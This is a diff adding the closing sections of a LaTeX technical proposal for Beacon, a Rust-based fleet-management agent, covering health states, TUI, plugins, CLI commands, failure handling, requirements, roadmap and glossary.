+\end{itemize}
+\end{multicols}
+
+% ═══════════════════════════════════════════════════════════════════════════════
+%  18. HEALTH ENGINE
+% ═══════════════════════════════════════════════════════════════════════════════
+\section{Health Engine}
+
+The agent reports a system-level health state visible in both TUI and REST API:
+
+\begin{center}
+\begin{tabular}{ll}
+\toprule
+State & Description \\
+\midrule
+\texttt{BOOTING}           & Initial startup sequence \\
+\texttt{INITIALIZING}      & First-time setup \\
+\texttt{ONLINE}            & Fully operational \\
+\texttt{DEGRADED}          & One or more subsystems impaired \\
+\texttt{OFFLINE\_BUFFERING}& Network lost, buffering locally \\
+\texttt{RECOVERING}        & Restoring from failure \\
+\texttt{FAILED}            & Critical subsystem failure \\
+\texttt{SHUTTING\_DOWN}    & Graceful shutdown in progress \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+% ═══════════════════════════════════════════════════════════════════════════════
+%  19. TUI
+% ═══════════════════════════════════════════════════════════════════════════════
+\section{Terminal User Interface (TUI)}
+
+Built using \textbf{Ratatui}. The TUI provides full management capability equivalent to the CLI and REST API.
+
+\subsection{Views}
+
+\begin{multicols}{3}
+\begin{itemize}[noitemsep,leftmargin=*]
+    \item Dashboard
+    \item Agents
+    \item Namespaces
+    \item Groups
+    \item Executions
+    \item Metrics
+    \item Logs
+    \item Audit
+    \item Queue
+    \item Users
+    \item Configuration
+    \item System Health
+    \item Collectors
+    \item Plugins
+\end{itemize}
+\end{multicols}
+
+\subsection{TUI Requirements}
+
+\begin{itemize}[noitemsep]
+    \item Keyboard-driven navigation
+    \item Live data updates (WebSocket-backed)
+    \item Search and filtering on all views
+    \item Role-aware menu visibility (Viewers cannot see execution controls)
+\end{itemize}
+
+% ═══════════════════════════════════════════════════════════════════════════════
+%  20. PLUGIN ARCHITECTURE
+% ═══════════════════════════════════════════════════════════════════════════════
+\section{Plugin Architecture}
+
+Beacon supports a first-class plugin system for extending core capabilities:
+
+\begin{center}
+\begin{tabular}{ll}
+\toprule
+Plugin Type & Purpose \\
+\midrule
+Metric Collectors & Custom hardware/software telemetry \\
+Operations        & New approved operation types \\
+Exporters         & Push data to external systems (Prometheus, Grafana) \\
+Notifications     & Alert channels (Slack, PagerDuty, email) \\
+Integrations      & Third-party system connectors \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+Plugin isolation requirements:
+
+\begin{itemize}[noitemsep]
+    \item Declared permission scope
+    \item Cryptographic signing
+    \item Independent versioning
+    \item Health and status tracking
+\end{itemize}
+
+% ═══════════════════════════════════════════════════════════════════════════════
+%  21. CLI REFERENCE
+% ═══════════════════════════════════════════════════════════════════════════════
+\section{CLI Reference}
+
+\subsection{Installation \& Service}
+
+\begin{lstlisting}[language=bash]
+beacon install / uninstall
+beacon service install / remove / start / stop / restart / status
+\end{lstlisting}
+
+\subsection{Initialization}
+
+\begin{lstlisting}[language=bash]
+beacon init
+# Prompts: Master Password, Captain/Commander/Viewer Passwords,
+#          Domain, Server IP, Ports, Intervals
+\end{lstlisting}
+
+\subsection{Authentication}
+
+\begin{lstlisting}[language=bash]
+beacon login / logout / whoami
+\end{lstlisting}
+
+\subsection{Namespace Management}
+
+\begin{lstlisting}[language=bash]
+beacon namespace create / edit / delete / list / show
+beacon namespace export / import
+beacon namespace run / stop / pause / resume
+\end{lstlisting}
+
+\subsection{Group Management}
+
+\begin{lstlisting}[language=bash]
+beacon group create / edit / delete / reorder
+beacon group add-namespace / remove-namespace
+beacon group run
+\end{lstlisting}
+
+\subsection{Agent Management}
+
+\begin{lstlisting}[language=bash]
+beacon agent list / show / enable / disable
+beacon agent remove / rename / regenerate-id
+\end{lstlisting}
+
+\subsection{User Management}
+
+\begin{lstlisting}[language=bash]
+beacon user create / edit / delete / enable / disable / list
+beacon user role assign
+\end{lstlisting}
+
+\subsection{Database Operations}
+
+\begin{lstlisting}[language=bash]
+beacon db status / backup / restore / compact / vacuum / verify / export
+beacon db clear / reset
+\end{lstlisting}
+
+\subsection{Encryption}
+
+\begin{lstlisting}[language=bash]
+beacon encryption enable / disable / rotate-key / status
+\end{lstlisting}
+
+\subsection{Queue Management}
+
+\begin{lstlisting}[language=bash]
+beacon queue status / clear / pause / resume / retry-failed
+\end{lstlisting}
+
+\subsection{Logs \& Audit}
+
+\begin{lstlisting}[language=bash]
+beacon logs / logs follow / logs export / logs search
+beacon logs clear / clear errors / clear warnings
+beacon audit logs / audit export / audit clear
+\end{lstlisting}
+
+\subsection{Scheduling \& Maintenance}
+
+\begin{lstlisting}[language=bash]
+beacon schedule create
+beacon maintenance enable <tag>
+beacon maintenance disable <tag>
+\end{lstlisting}
+
+\subsection{Connectivity}
+
+\begin{lstlisting}[language=bash]
+beacon server connect / disconnect / status / ping / test
+\end{lstlisting}
+
+% ═══════════════════════════════════════════════════════════════════════════════
+%  22. EDGE CASES & FAILURE HANDLING
+% ═══════════════════════════════════════════════════════════════════════════════
+\section{Edge Cases \& Failure Handling}
+
+\subsection{Execution Edge Cases}
+
+\begin{itemize}[noitemsep]
+    \item \textbf{Same namespace launched twice} — Lock Manager enforces configured mode (\texttt{deny}/\texttt{queue}/\texttt{replace}/\texttt{parallel})
+    \item \textbf{Namespace edited during execution} — Running execution is pinned to immutable version; new version takes effect on next launch
+    \item \textbf{Agent reboot during execution} — Recovery Engine resumes or marks the execution as interrupted on boot
+    \item \textbf{Timeout during execution} — Execution transitions to \texttt{TimedOut}; rollback policy applied
+    \item \textbf{Dependency failure} — Halts execution chain; audit record updated with failure reason
+\end{itemize}
+
+\subsection{Database Edge Cases}
+
+\begin{itemize}[noitemsep]
+    \item \textbf{Corrupted SQLite} — Integrity checks on startup trigger recovery from backup
+    \item \textbf{Full disk} — Logging and metrics degrade gracefully; alert emitted
+    \item \textbf{WAL corruption} — WAL is rebuilt from last clean checkpoint
+    \item \textbf{Backup restore mismatch} — Schema version validation rejects incompatible restores
+\end{itemize}
+
+\subsection{Authentication Edge Cases}
+
+\begin{itemize}[noitemsep]
+    \item \textbf{Brute force} — Progressive backoff with account lockout after threshold
+    \item \textbf{Password reset abuse} — Rate-limited; all attempts audited
+    \item \textbf{Recovery key theft} — Invalidated on use; new key issued
+    \item \textbf{Session replay} — JWT tokens are single-use via JTI claim tracking
+\end{itemize}
+
+\subsection{Metrics Edge Cases}
+
+\begin{itemize}[noitemsep]
+    \item \textbf{Missing sensors} — Collector marks as \texttt{Degraded}; null values emitted rather than crashing
+    \item \textbf{Invalid temperature data} — Out-of-range values are filtered and flagged
+    \item \textbf{Process explosion} — Collection is capped at configured process limit
+    \item \textbf{Collector crash} — Health Engine detects failure and marks collector \texttt{Failed}; restarts independently
+\end{itemize}
+
+\subsection{Queue Edge Cases}
+
+\begin{itemize}[noitemsep]
+    \item \textbf{Infinite retries} — Hard \texttt{max\_retries} cap; overflow enters Dead Letter Queue
+    \item \textbf{Duplicate delivery} — Deduplication by message ID at consumer
+    \item \textbf{Message corruption} — Checksum validation on dequeue; corrupted messages moved to Dead Letter Queue
+    \item \textbf{Dead-letter overflow} — Oldest dead-letter entries archived when queue limit reached
+\end{itemize}
+
+\subsection{WebSocket Edge Cases}
+
+\begin{itemize}[noitemsep]
+    \item \textbf{Slow consumers} — Back-pressure applied; oldest buffered frames dropped with warning
+    \item \textbf{Client floods} — Rate limiting per connection; connections exceeding limit closed
+    \item \textbf{Reconnect storms} — Exponential backoff enforced on reconnect
+    \item \textbf{Memory exhaustion} — Per-client buffer cap; server closes offending connections
+\end{itemize}
+
+\subsection{Logging Edge Cases}
+
+\begin{itemize}[noitemsep]
+    \item \textbf{Log storms} — Rate limited to \texttt{max\_log\_rate}; excess records dropped with counter
+    \item \textbf{Log injection} — All user-provided strings are sanitized before storage
+    \item \textbf{Huge command outputs} — Truncated at configurable limit; truncation recorded in log entry
+    \item \textbf{Recursive logging} — Logging subsystem writes directly to disk, never through itself
+\end{itemize}
+
+\subsection{System-Level Edge Cases}
+
+\begin{itemize}[noitemsep]
+    \item \textbf{Clock changes / time drift} — Timestamps are always UTC; monotonic clocks used for durations
+    \item \textbf{Network loss} — Offline buffering activates automatically
+    \item \textbf{Power loss} — SQLite WAL ensures durability; Recovery Engine handles interrupted executions on restart
+    \item \textbf{Service crash} — systemd/service manager restarts agent; Recovery Engine runs on boot
+    \item \textbf{Kernel upgrades} — Agent service survives restart; state is fully persisted in SQLite
+\end{itemize}
+
+% ═══════════════════════════════════════════════════════════════════════════════
+%  23. NON-FUNCTIONAL REQUIREMENTS
+% ═══════════════════════════════════════════════════════════════════════════════
+\section{Non-Functional Requirements}
+
+\begin{center}
+\begin{tabularx}{\textwidth}{lX}
+\toprule
+Requirement & Specification \\
+\midrule
+\textbf{Language}        & Rust only — no C bindings, no shell scripts in core \\
+\textbf{Runtime}         & Tokio async runtime; event-driven throughout \\
+\textbf{Architecture}    & x86\_64, ARM (including Raspberry Pi) \\
+\textbf{Service Model}   & Systemd service, auto-start, crash recovery \\
+\textbf{Scalability}     & 1 to 1\,000+ agents from single server instance \\
+\textbf{Offline}         & Full local operation without server connectivity \\
+\textbf{Security}        & Secure by default; no insecure defaults exposed \\
+\textbf{Shutdown}        & Graceful shutdown with in-flight execution completion \\
+\textbf{Testing}         & Comprehensive unit, integration, and property-based tests \\
+\textbf{Observability}   & Production-grade internal logging and health metrics \\
+\textbf{Extensibility}   & Plugin architecture for collectors, operations, exporters \\
+\textbf{Future}          & Multi-server federation support in roadmap \\
+\textbf{Parity}          & Full remote management parity with local CLI \\
+\textbf{Auditability}    & Every action traceable; audit trail is immutable \\
+\textbf{RBAC Design}     & Extensible to custom roles in future releases \\
+\bottomrule
+\end{tabularx}
+\end{center}
+
+% ═══════════════════════════════════════════════════════════════════════════════
+%  24. COMPARABLE SYSTEMS
+% ═══════════════════════════════════════════════════════════════════════════════
+\section{Comparable Systems}
+
+Beacon occupies a position at the intersection of several established infrastructure systems while remaining purpose-built and Rust-native:
+
+\begin{center}
+\begin{tabularx}{\textwidth}{llX}
+\toprule
+System & Domain & Overlap with Beacon \\
+\midrule
+Salt / Ansible  & Config Management    & Namespace-based execution, agent model \\
+Rundeck         & Operations Automation & RBAC execution, scheduling, audit trails \\
+Zabbix          & Monitoring           & Telemetry collection, alerting, agents \\
+Prometheus      & Metrics              & Time-series collection, retention tiers \\
+osquery         & Fleet Visibility     & Agent identity, process monitoring, audit \\
+\bottomrule
+\end{tabularx}
+\end{center}
+
+Unlike any single system above, Beacon unifies remote execution, telemetry, audit, scheduling, offline operation, and fleet management into a single Rust binary pair — with a TUI, REST API, and WebSocket streaming included.
+
+% ═══════════════════════════════════════════════════════════════════════════════
+%  25. ROADMAP
+% ═══════════════════════════════════════════════════════════════════════════════
+\section{Roadmap}
+
+\begin{center}
+\begin{tabularx}{\textwidth}{llX}
+\toprule
+Phase & Milestone & Scope \\
+\midrule
+1 & Agent Core          & Identity, Auth, Execution Engine, SQLite storage, basic CLI \\
+2 & Metrics \& Logging  & All collectors, logging engine, retention, TUI dashboard \\
+3 & Server + NATS       & Beacon Server, NATS integration, REST API, multi-agent \\
+4 & Audit \& Encryption & Immutable audit engine, AES-256-GCM, key rotation \\
+5 & Scheduler \& Groups & Full scheduler, namespace groups, maintenance windows \\
+6 & WebSocket \& TUI    & Full TUI, WebSocket streaming, live updates \\
+7 & Plugin System       & Plugin API, signing, exporter plugins \\
+8 & Fleet \& Federation & Multi-server support, tag-based fleet operations \\
+\bottomrule
+\end{tabularx}
+\end{center}
+
+% ═══════════════════════════════════════════════════════════════════════════════
+%  APPENDIX A: GLOSSARY
+% ═══════════════════════════════════════════════════════════════════════════════
+\appendix
+\section{Glossary}
+
+\begin{description}[style=nextline, labelwidth=4cm, leftmargin=4.5cm]
+    \item[\texttt{agent\_id}] SHA-256 identity derived from hardware characteristics. Stable across reboots.
+    \item[Approved Operation] A typed, versioned action that Beacon can execute (e.g., \texttt{update\_packages}). Not a shell string.
+    \item[Captain] Highest RBAC role. Full administrative control.
+    \item[Commander] Middle RBAC role. Can execute; cannot configure.
+    \item[Dead Letter Queue] Storage for messages that have exhausted all retry attempts.
+    \item[Execution Lock] Per-namespace concurrency control policy.
+    \item[JetStream] Persistent messaging layer built on NATS.
+    \item[Namespace] A versioned, reusable workflow containing one or more approved operations.
+    \item[NATS] High-performance message broker used for all agent-server communication.
+    \item[Recovery Key] Primary account recovery credential generated at initialization.
+    \item[Rollup] Aggregated metric snapshot at lower resolution for long-term retention.
+    \item[TUI] Terminal User Interface built with Ratatui.
+    \item[Viewer] Lowest RBAC role. Read-only access to all data.
+    \item[WAL] Write-Ahead Log — SQLite durability mechanism.
+\end{description}
+
+% ─── End of Document ──────────────────────────────────────────────────────────
+\vfill
+\begin{center}
+    \small\color{commentgray}
+    Beacon Technical Proposal · Version 1.0 \\
+    \end{center}
+
+\end{document}
